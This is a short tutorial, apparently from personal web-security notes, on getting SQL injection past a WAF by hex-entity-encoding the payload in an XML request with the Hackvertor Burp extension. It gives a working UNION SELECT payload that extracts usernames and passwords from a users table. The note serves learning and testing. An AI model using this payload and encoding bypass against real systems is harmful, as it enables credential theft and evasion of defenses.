# SQL injection with filter bypass via XML encoding

Some websites take input in JSON or XML format and use this to query the database. These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms.

## Hackvertor

Download hackvertor through burpsuite to encode XML.


Let supose this XML sending in POST method:

```XML
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
    <storeId>
            1 
    </storeId>
</stockCheck>
```

Store id is vulnerable to SQL injection but when we write SQL code inside, it is detected.

Select 1 -> right click -> extension -> Hackvertor -> encode -> hex_entities

- It will spwan a <@hex_entities><@/hex_entities> which will encode giving char to hex_entities to bypass filter:

```XML
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
    <storeId>
        <@hex_entities>
            1 UNION SELECT username||'~'||password FROM users
        <@/hex_entities>
    </storeId>
</stockCheck>
```

---

[**:arrow_right_hook: Back home**](/README.md)